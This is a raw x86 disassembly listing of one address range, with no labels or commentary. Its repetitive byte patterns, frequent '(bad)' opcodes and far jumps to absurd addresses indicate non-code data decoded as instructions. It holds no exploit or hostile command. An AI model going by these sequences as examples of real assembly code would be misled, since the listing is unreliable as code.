  43c53a:	inc    DWORD PTR [eax]
  43c53c:	add    BYTE PTR [edi],bl
  43c53e:	inc    DWORD PTR [eax]
  43c540:	add    BYTE PTR [edi],bl
  43c542:	inc    DWORD PTR [eax]
  43c544:	add    BYTE PTR [edi+edi*8],dl
  43c547:	add    BYTE PTR [eax],al
  43c549:	push   ds
  43c54a:	inc    DWORD PTR [eax]
  43c54c:	add    BYTE PTR [ecx],ah
  43c54e:	inc    DWORD PTR [eax]
  43c550:	add    BYTE PTR [edx],ch
  43c552:	inc    DWORD PTR [eax]
  43c554:	add    BYTE PTR [eax],ch
  43c556:	inc    DWORD PTR [eax]
  43c558:	add    BYTE PTR [edi+edi*8],ch
  43c55b:	add    BYTE PTR [eax],al
  43c55d:	sub    eax,0x320000ff
  43c562:	inc    DWORD PTR [eax]
  43c564:	add    BYTE PTR [edi+edi*8],ch
  43c567:	add    BYTE PTR [eax],al
  43c569:	sbb    al,0xff
  43c56b:	add    BYTE PTR [eax],al
  43c56d:	adc    eax,0x200000ff
  43c572:	inc    DWORD PTR [eax]
  43c574:	add    BYTE PTR [ecx],ch
  43c576:	inc    DWORD PTR [eax]
  43c578:	add    BYTE PTR [edi+edi*8],bl
  43c57b:	add    BYTE PTR [eax],al
  43c57d:	push   ss
  43c57e:	inc    DWORD PTR [eax]
  43c580:	add    BYTE PTR [edi+edi*8],dh
  43c583:	add    BYTE PTR [eax],al
  43c585:	sub    eax,0x290000ff
  43c58a:	inc    DWORD PTR [eax]
  43c58c:	add    BYTE PTR [edi+edi*8],ch
  43c58f:	add    BYTE PTR [eax],al
  43c591:	xor    eax,0x5e0000ff
  43c596:	inc    DWORD PTR [eax]
  43c598:	add    BYTE PTR [edx-0x1],dh
  43c59b:	add    BYTE PTR [eax],al
  43c59d:	xchg   ebp,eax
  43c59e:	dec    DWORD PTR [ebx*1-0x137002d]
  43c5a5:	icebp  
  43c5a6:	jmp    FWORD PTR [eax+0x6effe9ec]
  43c5ac:	into   
  43c5ad:	(bad)  
  43c5af:	xchg   ebx,eax
  43c5b0:	fsubr  st(3),st
  43c5b2:	dec    ebp
  43c5b4:	(bad)  
  43c5b5:	clc    
  43c5b6:	call   edi
  43c5b8:	(bad)  
  43c5b9:	cli    
  43c5ba:	jmp    FWORD PTR [edx-0x49]
  43c5bd:	lock inc DWORD PTR [eax]
  43c5c0:	sbb    al,0xd5
  43c5c2:	inc    DWORD PTR [eax]
  43c5c4:	add    BYTE PTR [edi+edi*8-0x6b0000],ch
  43c5cb:	add    BYTE PTR [eax],al
  43c5cd:	cmp    edi,0xff760000
  43c5d3:	add    BYTE PTR [eax],al
  43c5d5:	jl     0x43c5d6
  43c5d7:	add    BYTE PTR [eax],al
  43c5d9:	(bad)  
  43c5da:	inc    DWORD PTR [eax]
  43c5dc:	add    BYTE PTR [ebp-0x73ffff01],dl
  43c5e2:	inc    DWORD PTR [eax]
  43c5e4:	add    BYTE PTR [esi-0x4affff01],ch
  43c5ea:	inc    DWORD PTR [eax]
  43c5ec:	add    BYTE PTR [ebp-0x4fffff01],ch
  43c5f2:	inc    DWORD PTR [eax]
  43c5f4:	add    BYTE PTR [edx-0x33ffff01],bh
  43c5fa:	inc    DWORD PTR [eax]
  43c5fc:	add    cl,dl
  43c5fe:	inc    DWORD PTR [eax]
  43c600:	add    dl,dl
  43c602:	inc    DWORD PTR [eax]
  43c604:	add    dh,dl
  43c606:	inc    DWORD PTR [eax]
  43c608:	add    ch,cl
  43c60a:	inc    DWORD PTR [eax]
  43c60c:	add    ah,bl
  43c60e:	dec    DWORD PTR ds:0xcffde2b
  43c614:	sub    al,0xdb
  43c616:	call   DWORD PTR [ebx+eax*2]
  43c619:	jmp    0x9cff:0xf1c89cff
  43c620:	mov    bl,0xf0
  43c622:	inc    DWORD PTR [esp+eiz*4-0x240019]
  43c629:	lock call DWORD PTR [ebp+0xffeae7]
  43c630:	add    BYTE PTR [edi+edi*8+0x0],bh
  43c634:	add    BYTE PTR [eax-0x1],ah
  43c637:	add    BYTE PTR [eax],al
  43c639:	dec    ebp
  43c63a:	inc    DWORD PTR [eax]
  43c63c:	add    BYTE PTR [edi+edi*8+0x0],al
  43c640:	add    BYTE PTR [edi+edi*8+0x0],cl
  43c644:	add    BYTE PTR [eax-0x1],al
  43c647:	add    BYTE PTR [eax],al
  43c649:	xor    bh,bh
  43c64b:	add    BYTE PTR [eax],al
  43c64d:	inc    edx
  43c64e:	inc    DWORD PTR [eax]
  43c650:	add    BYTE PTR [ecx-0x1],bl
  43c653:	add    DWORD PTR [ecx],eax
  43c655:	arpl   di,di
  43c657:	aas    
  43c658:	dec    ebp
  43c659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c65a:	inc    eax
  43c65c:	loope  0x43c64c
  43c65e:	call   ebx
  43c660:	(bad)  
  43c661:	idiv   bh
  43c663:	jb     0x43c620
  43c665:	(bad)  
  43c667:	das    
  43c668:	popf   
  43c669:	int    0xff
  43c66b:	xor    esp,DWORD PTR [ebp-0x2f780030]
  43c671:	out    0xff,al
  43c673:	cdq    
  43c674:	fld1   
  43c676:	jmp    FWORD PTR [eax-0x35]
  43c679:	(bad)  
  43c67b:	sbb    al,0xa3
  43c67d:	sar    bh,1
  43c67f:	xor    DWORD PTR [ecx-0x47980031],esp
  43c685:	fdivr  st,st(7)
  43c687:	mov    ah,0xe4
  43c689:	repnz call FWORD PTR [esi+edx*8-0x4ca5001a]
  43c691:	aam    0xff
  43c693:	jne    0x43c66c
  43c695:	jmp    0xbbff:0xe9dea8ff
  43c69c:	cli    
  43c69d:	hlt    
  43c69e:	(bad)  
  43c69f:	in     al,dx
  43c6a0:	(bad)  
  43c6a1:	(bad)  
  43c6a2:	push   DWORD PTR [esi+0x29fffdf8]
  43c6a8:	nop
  43c6a9:	out    0xff,al
  43c6ab:	add    BYTE PTR [eax],al
  43c6ad:	scas   al,BYTE PTR es:[edi]
  43c6ae:	inc    DWORD PTR [eax]
  43c6b0:	add    cl,cl
  43c6b2:	jmp    DWORD PTR [edx+ebx*8-0x13]
  43c6b6:	(bad)  
  43c6b7:	jle    0x43c689
  43c6b9:	clc    
  43c6ba:	call   DWORD PTR [ecx]
  43c6bc:	(bad)  
  43c6bd:	jmp    0x94ff:0xdedb8dff
  43c6c4:	fldl2t 
  43c6c6:	jmp    FWORD PTR [eax-0x3b]
  43c6c9:	loope  0x43c6ca
  43c6cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c6cc:	loop   0x43c6be
  43c6ce:	inc    ebp
  43c6d0:	repz cmc 
  43c6d2:	call   ebp
  43c6d4:	div    esp
  43c6d6:	(bad)  
  43c6d7:	mov    esi,0xd4ffe9ea
  43c6dc:	repnz lock dec edi
  43c6e0:	cmc    
  43c6e1:	out    dx,eax
  43c6e2:	(bad)  
  43c6e3:	mov    eax,0xcdffe3f2
  43c6e8:	push   ecx
  43c6ea:	jmp    esp
  43c6ec:	cld    
  43c6ed:	(bad)  
  43c6ee:	jmp    FWORD PTR [ecx]
  43c6f0:	dec    edx
  43c6f1:	retf   0xff
  43c6f4:	add    BYTE PTR [ebx+0x610000ff],al
  43c6fa:	inc    DWORD PTR [eax]
  43c6fc:	add    BYTE PTR [eax-0x1],cl
  43c6ff:	add    BYTE PTR [eax],al
  43c701:	cmp    eax,0x250000ff
  43c706:	inc    DWORD PTR [eax]
  43c708:	add    BYTE PTR [edi+edi*8],ah
  43c70b:	add    BYTE PTR [eax],al
  43c70d:	sub    edi,edi
  43c70f:	add    BYTE PTR [eax],al
  43c711:	and    al,0xff
  43c713:	add    BYTE PTR [eax],al
  43c715:	sub    edi,edi
  43c717:	add    BYTE PTR [eax],al
  43c719:	and    bh,bh
  43c71b:	add    BYTE PTR [eax],al
  43c71d:	and    al,0xff
  43c71f:	add    BYTE PTR [eax],al
  43c721:	and    bh,bh
  43c723:	add    BYTE PTR [eax],al
  43c725:	xor    bh,bh
  43c727:	add    BYTE PTR [eax],al
  43c729:	sbb    edi,edi
  43c72b:	add    BYTE PTR [eax],al
  43c72d:	sub    bh,bh
  43c72f:	add    BYTE PTR [eax],al
  43c731:	inc    DWORD PTR es:[eax]
  43c734:	add    BYTE PTR [ecx],bl
  43c736:	inc    DWORD PTR [eax]
  43c738:	add    BYTE PTR [edx],bl
  43c73a:	inc    DWORD PTR [eax]
  43c73c:	add    BYTE PTR [edx],ah
  43c73e:	inc    DWORD PTR [eax]
  43c740:	add    BYTE PTR [edx],ah
  43c742:	inc    DWORD PTR [eax]
  43c744:	add    BYTE PTR [ecx],bl
  43c746:	inc    DWORD PTR [eax]
  43c748:	add    BYTE PTR [edx],ah
  43c74a:	inc    DWORD PTR [eax]
  43c74c:	add    BYTE PTR [edi],bl
  43c74e:	inc    DWORD PTR [eax]
  43c750:	add    BYTE PTR [edi+edi*8],ah
  43c753:	add    BYTE PTR [eax],al
  43c755:	and    bh,bh
  43c757:	add    BYTE PTR [eax],al
  43c759:	sub    bh,bh
  43c75b:	add    BYTE PTR [eax],al
  43c75d:	and    edi,edi
  43c75f:	add    BYTE PTR [eax],al
  43c761:	and    edi,edi
  43c763:	add    BYTE PTR [eax],al
  43c765:	and    edi,edi
  43c767:	add    BYTE PTR [eax],al
  43c769:	adc    edi,edi
  43c76b:	add    BYTE PTR [eax],al
  43c76d:	sbb    al,0xff
  43c76f:	add    BYTE PTR [eax],al
  43c771:	adc    eax,0x1b0000ff
  43c776:	inc    DWORD PTR [eax]
  43c778:	add    BYTE PTR [ebx],ch
  43c77a:	inc    DWORD PTR [eax]
  43c77c:	add    BYTE PTR [edi+edi*8],dl
  43c77f:	add    BYTE PTR [eax],al
  43c781:	sbb    bh,bh
  43c783:	add    BYTE PTR [eax],al
  43c785:	and    bh,bh
  43c787:	add    BYTE PTR [eax],al
  43c789:	and    al,0xff
  43c78b:	add    BYTE PTR [eax],al
  43c78d:	xor    bh,bh
  43c78f:	add    BYTE PTR [eax],al
  43c791:	inc    ebp
  43c792:	inc    DWORD PTR [eax]
  43c794:	add    BYTE PTR [ebp-0x1],ah
  43c797:	add    BYTE PTR [eax],al
  43c799:	mov    edi,?
  43c79b:	add    BYTE PTR [eax],al
  43c79d:	mov    al,0xff
  43c79f:	mov    bh,0xe4
  43c7a1:	stc    
  43c7a2:	call   edx
  43c7a4:	(bad)  
  43c7a5:	clc    
  43c7a6:	jmp    FWORD PTR [edi+eax*8-0x27]
  43c7aa:	jmp    FWORD PTR [edi]
  43c7ac:	mov    ds:0xb212ffc3,eax
  43c7b1:	into   
  43c7b2:	jmp    FWORD PTR [ecx]
  43c7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c7b5:	(bad)  
  43c7b8:	loopne 0x43c79f
  43c7ba:	(bad)  
  43c7bb:	fcos   
  43c7bd:	std    
  43c7be:	jmp    FWORD PTR [edx+0x5efff6f1]
  43c7c4:	jbe    0x43c7b7
  43c7c6:	(bad)  
  43c7c7:	cmp    ecx,DWORD PTR [edi-0x15]
  43c7ca:	dec    DWORD PTR [edx]
  43c7cc:	adc    dh,BYTE PTR [esi-0x1]
  43c7cf:	add    DWORD PTR [ecx],eax
  43c7d1:	call   0xff:0xae0000ff
  43c7d8:	sbb    edi,DWORD PTR [ebp-0x2078ce01]
  43c7de:	dec    DWORD PTR [esi+ebp*2-0x48]
  43c7e2:	(bad)  
  43c7e3:	js     0x43c76b
  43c7e5:	in     al,0xff
  43c7e7:	adc    BYTE PTR [esi+ebp*8-0x11909101],0xff
  43c7ef:	pop    ebx
  43c7f0:	jle    0x43c7dc
  43c7f2:	call   DWORD PTR [eax+0x7bffeca3]
  43c7f8:	cwde   
  43c7f9:	jmp    0xf485f8fd
  43c7fe:	(bad)  
  43c7ff:	ds push 0xfffffffc
  43c802:	push   DWORD PTR [ecx]
  43c804:	cmp    esp,0xffffffff
  43c807:	pop    esp
  43c808:	test   al,0xfb
  43c80a:	push   DWORD PTR [ebp+edx*8-0xd420003]
  43c811:	std    
  43c812:	dec    eax
  43c814:	(bad)  
  43c815:	(bad)  
  43c816:	(bad)  
  43c817:	(bad)  
  43c819:	repz call ebx
  43c81c:	jmp    0xe7eac810
  43c821:	loop   0x43c822
  43c823:	ret    
  43c824:	push   eax
  43c826:	jmp    ebx
  43c828:	push   edi
  43c82a:	call   FWORD PTR [edx]
  43c82c:	cs (bad) 
  43c82e:	inc    DWORD PTR [eax]
  43c830:	add    BYTE PTR [ebp-0x1],bh
  43c833:	add    BYTE PTR [eax],al
  43c835:	(bad)  
  43c836:	inc    DWORD PTR [eax]
  43c838:	add    BYTE PTR [edi+edi*8],bh
  43c83b:	add    BYTE PTR [eax],al
  43c83d:	cmp    bh,bh
  43c83f:	add    BYTE PTR [eax],al
  43c841:	inc    edi
  43c842:	inc    DWORD PTR [eax]
  43c844:	add    BYTE PTR [edx],bh
  43c846:	inc    DWORD PTR [eax]
  43c848:	add    BYTE PTR [eax],bh
  43c84a:	inc    DWORD PTR [eax]
  43c84c:	add    BYTE PTR [esi-0x1],cl
  43c84f:	add    BYTE PTR [eax],al
  43c851:	push   esp
  43c852:	inc    DWORD PTR [eax]
  43c854:	add    BYTE PTR [edi-0x1],dl
  43c857:	add    BYTE PTR [eax],al
  43c859:	jge    0x43c85a
  43c85b:	sbb    esp,DWORD PTR [eax+esi*4]
  43c85e:	push   DWORD PTR [ecx-0x5600103f]
  43c864:	loope  0x43c859
  43c866:	call   DWORD PTR [ebx]
  43c868:	mov    al,ds:0x8d21ffe7
  43c86d:	fdivr  st,st(7)
  43c86f:	pop    ss
  43c870:	mov    eax,edx
  43c872:	jmp    DWORD PTR [ecx]
  43c874:	test   al,0xd9
  43c876:	jmp    FWORD PTR [esi+eax*8]
  43c879:	out    0xff,al
  43c87b:	daa    
  43c87c:	aam    0xe8
  43c87e:	call   FWORD PTR ds:0x19ffe2c9
  43c884:	(bad)  
  43c885:	fdivp  st(7),st
  43c887:	and    eax,0x3effe7d6
  43c88c:	stos   BYTE PTR es:[edi],al
  43c88d:	fdivr  st,st(7)
  43c88f:	fs mov ebx,0xa034ffdf
  43c895:	sar    edi,1
  43c897:	sub    BYTE PTR [eax-0x62be003d],cl
  43c89d:	retf   0xafff
  43c8a0:	lock jmp 0x43c8a2
  43c8a3:	aad    0xff
  43c8a5:	clc    
  43c8a6:	jmp    DWORD PTR [ebp+0x6bfffdea]
  43c8ac:	mov    bl,0xd4
  43c8ae:	dec    DWORD PTR [esi]
  43c8b0:	and    BYTE PTR [ebx-0x174cbf01],bh
  43c8b6:	call   DWORD PTR [ebp+0x28fff0e3]
  43c8bc:	mov    bl,0xea
  43c8be:	inc    DWORD PTR [eax]
  43c8c0:	lahf   
  43c8c1:	(bad)  
  43c8c2:	push   DWORD PTR [ecx-0x34]
  43c8c5:	fdivp  st(7),st
  43c8c7:	pop    ecx
  43c8c8:	mov    bh,0xe1
  43c8ca:	call   DWORD PTR [edx-0x46]
  43c8cd:	in     al,0xff
  43c8cf:	addr16 mov esp,0xc369ffe6
  43c8d5:	out    0xff,eax
  43c8d7:	arpl   bp,ax
  43c8d9:	jmp    0xe8fc1edd
  43c8de:	call   DWORD PTR [ebx-0x3b]
  43c8e1:	in     eax,0xff
  43c8e3:	cs call 0xffda:0x8317ffdc
  43c8eb:	int3   
  43c8ec:	std    
  43c8ed:	jmp    0xf13884f1
  43c8f2:	call   DWORD PTR [esi]
  43c8f4:	xor    edi,DWORD PTR [edi-0x7fffff01]
  43c8fa:	inc    DWORD PTR [eax]
  43c8fc:	add    BYTE PTR [ebx-0x1],bl
  43c8ff:	add    BYTE PTR [eax],al
  43c901:	inc    ebp
  43c902:	inc    DWORD PTR [eax]
  43c904:	add    BYTE PTR [eax],ch
  43c906:	inc    DWORD PTR [eax]
  43c908:	add    BYTE PTR [eax],ch
  43c90a:	inc    DWORD PTR [eax]
  43c90c:	add    BYTE PTR ds:0x1d0000ff,ah
  43c912:	inc    DWORD PTR [eax]
  43c914:	add    BYTE PTR [edx],dh
  43c916:	inc    DWORD PTR [eax]
  43c918:	add    BYTE PTR [edx],ah
  43c91a:	inc    DWORD PTR [eax]
  43c91c:	add    BYTE PTR [ebx],bl
  43c91e:	inc    DWORD PTR [eax]
  43c920:	add    BYTE PTR [ebx],ah
  43c922:	inc    DWORD PTR [eax]
  43c924:	add    BYTE PTR [eax],ah
  43c926:	inc    DWORD PTR [eax]
  43c928:	add    BYTE PTR [ecx],ah
  43c92a:	inc    DWORD PTR [eax]
  43c92c:	add    BYTE PTR [edx],ah
  43c92e:	inc    DWORD PTR [eax]
  43c930:	add    BYTE PTR [edi],ah
  43c932:	inc    DWORD PTR [eax]
  43c934:	add    BYTE PTR ds:0x230000ff,ah
  43c93a:	inc    DWORD PTR [eax]
  43c93c:	add    BYTE PTR [ebx],ah
  43c93e:	inc    DWORD PTR [eax]
  43c940:	add    BYTE PTR ds:0x190000ff,bl
  43c946:	inc    DWORD PTR [eax]
  43c948:	add    BYTE PTR [edx],bl
  43c94a:	inc    DWORD PTR [eax]
  43c94c:	add    BYTE PTR [esi],ah
  43c94e:	inc    DWORD PTR [eax]
  43c950:	add    BYTE PTR [ebx],bl
  43c952:	inc    DWORD PTR [eax]
  43c954:	add    BYTE PTR [edi+edi*8],ah
  43c957:	add    BYTE PTR [eax],al
  43c959:	sbb    eax,0x210000ff
  43c95e:	inc    DWORD PTR [eax]
  43c960:	add    BYTE PTR [eax],ch
  43c962:	inc    DWORD PTR [eax]
  43c964:	add    BYTE PTR [esi],bl
  43c966:	inc    DWORD PTR [eax]
  43c968:	add    BYTE PTR [edx],ah
  43c96a:	inc    DWORD PTR [eax]
  43c96c:	add    BYTE PTR [ecx],ch
  43c96e:	inc    DWORD PTR [eax]
  43c970:	add    BYTE PTR [ebx],ah
  43c972:	inc    DWORD PTR [eax]
  43c974:	add    BYTE PTR [ecx],bl
  43c976:	inc    DWORD PTR [eax]
  43c978:	add    BYTE PTR [edi+edi*8],ah
  43c97b:	add    BYTE PTR [eax],al
  43c97d:	and    bh,bh
  43c97f:	add    BYTE PTR [eax],al
  43c981:	sub    al,0xff
  43c983:	add    BYTE PTR [eax],al
  43c985:	push   ss
  43c986:	inc    DWORD PTR [eax]
  43c988:	add    BYTE PTR [edx],dh
  43c98a:	inc    DWORD PTR [eax]
  43c98c:	add    BYTE PTR [eax-0x1],al
  43c98f:	add    BYTE PTR [eax],al
  43c991:	inc    DWORD PTR fs:[eax]
  43c994:	add    BYTE PTR [eax-0x4effff01],cl
  43c99a:	(bad)  
  43c99b:	js     0x43c949
  43c99d:	repz (bad) 
  43c99f:	fdivr  st,st(7)
  43c9a1:	cli    
  43c9a2:	inc    DWORD PTR [ecx+ecx*8-0x36820026]
  43c9a9:	fcos   
  43c9ab:	pop    ecx
  43c9ac:	mov    esp,0xb82effd4
  43c9b1:	sar    edi,1
  43c9b3:	or     eax,0x34ffc5a3
  43c9b8:	mov    eax,0xda8bffd2
  43c9bd:	jecxz  0x43c9be
  43c9bf:	scas   eax,DWORD PTR es:[edi]
  43c9c0:	jmp    0xfff2:0xf0bcfff5
  43c9c7:	ret    0xffff
  43c9ca:	push   DWORD PTR [ebx]
  43c9cc:	jnp    0x43c99a
  43c9ce:	inc    DWORD PTR [eax]
  43c9d0:	add    dl,al
  43c9d2:	inc    DWORD PTR [eax]
  43c9d4:	add    BYTE PTR [edi+edi*8-0x16bce],dh
  43c9db:	mov    eax,ds:0xc4fff5ea
  43c9e0:	push   ecx
  43c9e2:	push   DWORD PTR [ebp-0x49001907]
  43c9e8:	jmp    esi
  43c9ea:	(bad)  
  43c9eb:	mov    edx,0xd5ffedff
  43c9f0:	(bad)  
  43c9f1:	cld    
  43c9f2:	jmp    DWORD PTR [ebp+0x21fff0ee]
  43c9f8:	test   eax,0xf88cffd6
  43c9fd:	aam    0xff
  43c9ff:	mov    ebp,0xb7ffdfff
  43ca04:	jmp    ecx
  43ca06:	(bad)  
  43ca07:	mov    edx,0xc5ffe9ff
  43ca0c:	jmp    ebx
  43ca0e:	jmp    esp
  43ca10:	std    
  43ca11:	out    dx,eax
  43ca12:	jmp    FWORD PTR [ebp-0x44001e1a]
  43ca18:	jmp    0xef05ca05
  43ca1d:	out    0xff,al
  43ca1f:	gs into 
  43ca21:	mov    edx,0xecffc4ff
  43ca26:	call   DWORD PTR [esi+0xfff0c4]
  43ca2c:	add    BYTE PTR [edi-0x7effff01],ch
  43ca32:	inc    DWORD PTR [eax]
  43ca34:	add    BYTE PTR [ebp-0x1],dl
  43ca37:	add    BYTE PTR [eax],al
  43ca39:	dec    ebx
  43ca3a:	inc    DWORD PTR [eax]
  43ca3c:	add    BYTE PTR ds:0x300000ff,bh
  43ca42:	inc    DWORD PTR [eax]
  43ca44:	add    BYTE PTR [ecx-0x1],al
  43ca47:	add    BYTE PTR [eax],al
  43ca49:	cmp    edi,edi
  43ca4b:	add    BYTE PTR [eax],al
  43ca4d:	dec    esp
  43ca4e:	inc    DWORD PTR [eax]
  43ca50:	add    BYTE PTR [edi+edi*8+0x0],ah
  43ca54:	add    BYTE PTR [edx-0x1],dl
  43ca57:	add    BYTE PTR [eax],al
  43ca59:	pop    ebp
  43ca5a:	inc    DWORD PTR [eax]
  43ca5c:	add    BYTE PTR [ecx-0x4df5f801],cl
  43ca62:	jmp    DWORD PTR [eax-0x55000f49]
  43ca68:	jecxz  0x43ca61
  43ca6a:	(bad)  
  43ca6b:	cmp    BYTE PTR [ecx-0x66d10012],cl
  43ca71:	out    0xff,al
  43ca73:	sub    DWORD PTR [edx-0x45ca002e],ecx
  43ca79:	loop   0x43ca7a
  43ca7b:	aaa    
  43ca7c:	mov    edx,0x7f23ffe2
  43ca81:	int    0xff
  43ca83:	daa    
  43ca84:	mov    ebp,0xca27ffe2
  43ca89:	jecxz  0x43ca8a
  43ca8b:	ss fsub st(3),st
  43ca8e:	(bad)  
  43ca8f:	ds int 0xea
  43ca92:	push   DWORD PTR [esi+ebx*4]
  43ca95:	(bad)  
  43ca96:	push   DWORD PTR [edx]
  43ca98:	add    bl,0xff
  43ca9b:	sub    al,0x86
  43ca9d:	ret    
  43ca9e:	call   DWORD PTR [eax]
  43caa0:	jge    0x43ca63
  43caa2:	dec    DWORD PTR [edx]
  43caa4:	jl     0x43ca61
  43caa6:	call   FWORD PTR [eax+eiz*8-0x1e560017]
  43caad:	idiv   edi
  43caaf:	push   0x29ffe07d
  43cab4:	push   esp
  43cab5:	aad    0xff
  43cab7:	ja     0x43caa1
  43cab9:	jmp    0xee0a42bd
  43cabe:	inc    DWORD PTR [eax]
  43cac0:	lahf   
  43cac1:	sar    edi,1
  43cac3:	dec    edx
  43cac4:	ror    esi,0xff
  43cac7:	push   edi
  43cac8:	(bad)
  43cacb:	dec    edi
  43cacc:	mov    ah,0xdc
  43cace:	inc    DWORD PTR [ebp-0x50]
  43cad1:	fdivp  st(7),st
  43cad3:	dec    edx
  43cad4:	shl    bh,0xff
  43cad7:	ds stos BYTE PTR es:[edi],al
  43cad9:	(bad)  
  43cadb:	inc    ecx
  43cadc:	mov    cl,0xe2
  43cade:	inc    DWORD PTR [edi-0x42]
  43cae1:	jecxz  0x43cae2
  43cae3:	cmp    ch,BYTE PTR [ecx+0x6914ffe7]
  43cae9:	out    0xff,eax
  43caeb:	and    BYTE PTR [ebx-0x1243001f],bl
  43caf1:	loopne 0x43caf2
  43caf3:	outs   dx,BYTE PTR ds:[esi]
  43caf4:	xchg   ecx,eax
  43caf5:	loope  0x43caf6
  43caf7:	add    BYTE PTR [eax],al
  43caf9:	call   0xff:0x740000ff
  43cb00:	add    BYTE PTR [edx-0x1],dl
  43cb03:	add    BYTE PTR [eax],al
  43cb05:	cmp    bh,bh
  43cb07:	add    BYTE PTR [eax],al
  43cb09:	aaa    
  43cb0a:	inc    DWORD PTR [eax]
  43cb0c:	add    BYTE PTR [ebx],bh
  43cb0e:	inc    DWORD PTR [eax]
  43cb10:	add    BYTE PTR ds:0x2c0000ff,dh
  43cb16:	inc    DWORD PTR [eax]
  43cb18:	add    BYTE PTR [edx],ch
  43cb1a:	inc    DWORD PTR [eax]
  43cb1c:	add    BYTE PTR [edi],bl
  43cb1e:	inc    DWORD PTR [eax]
  43cb20:	add    BYTE PTR [ecx],ah
  43cb22:	inc    DWORD PTR [eax]
  43cb24:	add    BYTE PTR [edx],ah
  43cb26:	inc    DWORD PTR [eax]
  43cb28:	add    BYTE PTR [edi+edi*8],ch
  43cb2b:	add    BYTE PTR [eax],al
  43cb2d:	sbb    al,0xff
  43cb2f:	add    BYTE PTR [eax],al
  43cb31:	pop    ds
  43cb32:	inc    DWORD PTR [eax]
  43cb34:	add    BYTE PTR [eax],ah
  43cb36:	inc    DWORD PTR [eax]
  43cb38:	add    BYTE PTR [esi],ah
  43cb3a:	inc    DWORD PTR [eax]
  43cb3c:	add    BYTE PTR [edi],bl
  43cb3e:	inc    DWORD PTR [eax]
  43cb40:	add    BYTE PTR [edi+edi*8],bl
  43cb43:	add    BYTE PTR [eax],al
  43cb45:	pop    ss
  43cb46:	inc    DWORD PTR [eax]
  43cb48:	add    BYTE PTR [ebx],bl
  43cb4a:	inc    DWORD PTR [eax]
  43cb4c:	add    BYTE PTR [edi],bl
  43cb4e:	inc    DWORD PTR [eax]
  43cb50:	add    BYTE PTR [ecx],bl
  43cb52:	inc    DWORD PTR [eax]
  43cb54:	add    BYTE PTR ds:0x250000ff,ah
  43cb5a:	inc    DWORD PTR [eax]
  43cb5c:	add    BYTE PTR ds:0x1a0000ff,bl
  43cb62:	inc    DWORD PTR [eax]
  43cb64:	add    BYTE PTR [ecx],ah
  43cb66:	inc    DWORD PTR [eax]
  43cb68:	add    BYTE PTR [esi],bl
  43cb6a:	inc    DWORD PTR [eax]
  43cb6c:	add    BYTE PTR [ecx],ah
  43cb6e:	inc    DWORD PTR [eax]
  43cb70:	add    BYTE PTR [esi],ah
  43cb72:	inc    DWORD PTR [eax]
  43cb74:	add    BYTE PTR [ebx],ah
  43cb76:	inc    DWORD PTR [eax]
  43cb78:	add    BYTE PTR [eax],dh
  43cb7a:	inc    DWORD PTR [eax]
  43cb7c:	add    BYTE PTR [ebx],ah
  43cb7e:	inc    DWORD PTR [eax]
  43cb80:	add    BYTE PTR [edi+edi*8],dh
  43cb83:	add    BYTE PTR [eax],al
  43cb85:	cmp    eax,0x450000ff
  43cb8a:	inc    DWORD PTR [eax]
  43cb8c:	add    BYTE PTR [esi-0x1],bl
  43cb8f:	add    BYTE PTR [eax],al
  43cb91:	cmp    edi,0xffb40501
  43cb97:	scas   al,BYTE PTR es:[edi]
  43cb98:	sar    eax,1
  43cb9a:	call   esi
  43cb9c:	(bad)  
  43cb9d:	sti    
  43cb9e:	push   DWORD PTR [ebx+0x2effe5dc]
  43cba4:	xchg   esi,eax
  43cba5:	mov    edx,0xe0dc82ff
  43cbaa:	inc    DWORD PTR [edi+0x1bffe9e6]
  43cbb0:	test   eax,0xb029ffc8
  43cbb5:	(bad)  
  43cbb6:	jmp    FWORD PTR [ebx]
  43cbb8:	mov    cl,0xcd
  43cbba:	call   FWORD PTR [ebx]
  43cbbc:	mov    dh,0xd0
  43cbbe:	jmp    FWORD PTR [eax-0x27]
  43cbc1:	jecxz  0x43cbc2
  43cbc3:	jb     0x43cb92
  43cbc5:	in     eax,0xff
  43cbc7:	mov    al,0xdd
  43cbc9:	out    dx,eax
  43cbca:	push   DWORD PTR [ebx-0x75]
  43cbcd:	call   0xcd43ccd1
  43cbd2:	inc    DWORD PTR [eax]
  43cbd4:	add    BYTE PTR [edi+edi*8-0x30036],bl
  43cbdb:	(bad)  
  43cbdc:	aam    0xe3
  43cbde:	inc    DWORD PTR [esi-0x3f]
  43cbe1:	aad    0xff
  43cbe3:	inc    edi
  43cbe4:	mov    dl,0xcb
  43cbe6:	push   DWORD PTR ds:0x55ffcbab
  43cbec:	mov    eax,0xd372ffc8
  43cbf1:	aad    0xff
  43cbf3:	xor    ah,BYTE PTR [ebx-0x33960022]
  43cbf9:	in     eax,dx
  43cbfa:	jmp    FWORD PTR [esi-0x17]
  43cbfd:	fdiv   st(7),st
  43cbff:	addr16 int 0xcd
  43cc02:	call   DWORD PTR [eax-0x77002223]
  43cc08:	fcmovu st,st(5)
  43cc0a:	inc    DWORD PTR [edi-0x2c]
  43cc0d:	(bad)  
  43cc0f:	pop    ecx
  43cc10:	fucom  st(2)
  43cc12:	inc    DWORD PTR [edx-0x2d]
  43cc15:	fcos   
  43cc17:	push   edi
  43cc18:	fcomp  st(4)
  43cc1a:	dec    DWORD PTR [edx-0x53002427]
  43cc20:	in     al,0xd9
  43cc22:	call   esi
  43cc24:	(bad)  
  43cc25:	clc    
  43cc26:	dec    DWORD PTR [edi+edx*1]
  43cc29:	fdivr  st,st(7)
  43cc2b:	add    BYTE PTR [eax],al
  43cc2d:	call   0xff:0x740000ff
  43cc34:	add    BYTE PTR [edi-0x1],bl
  43cc37:	add    BYTE PTR [eax],al
  43cc39:	push   ebp
  43cc3a:	inc    DWORD PTR [eax]
  43cc3c:	add    BYTE PTR [esi],ch
  43cc3e:	inc    DWORD PTR [eax]
  43cc40:	add    BYTE PTR [edx],ch
  43cc42:	inc    DWORD PTR [eax]
  43cc44:	add    BYTE PTR [ebx],dh
  43cc46:	inc    DWORD PTR [eax]
  43cc48:	add    BYTE PTR [ecx],bh
  43cc4a:	inc    DWORD PTR [eax]
  43cc4c:	add    BYTE PTR [ebx-0x1],al
  43cc4f:	add    BYTE PTR [eax],al
  43cc51:	push   eax
  43cc52:	inc    DWORD PTR [eax]
  43cc54:	add    BYTE PTR [edx-0x1],bl
  43cc57:	add    BYTE PTR [eax],al
  43cc59:	dec    edi
  43cc5a:	inc    DWORD PTR [eax]
